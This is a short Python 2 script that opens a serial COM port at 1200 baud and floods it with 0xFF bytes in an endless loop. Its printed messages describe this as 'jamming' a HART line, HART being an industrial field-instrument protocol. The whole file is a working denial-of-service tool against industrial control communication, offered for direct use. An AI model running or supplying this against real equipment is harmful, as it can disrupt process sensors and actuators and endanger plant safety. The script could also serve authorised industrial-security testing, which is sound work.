import serial,time
import sys

def dump_hex(string):
	return " ".join(x.encode('hex') for x in string)
	
port = 3

if len(sys.argv) >= 2:
	port = int(sys.argv[1]) - 1

print "Opening COM" + str(port + 1) + "..."

ser = serial.Serial(port, 1200)

print "Starting jammiing HART line on " + str(port) + "."
print "Please CTRL+C to stop."

while True:
	ser.write('\xff' * 250)	

	time.sleep(0.01)
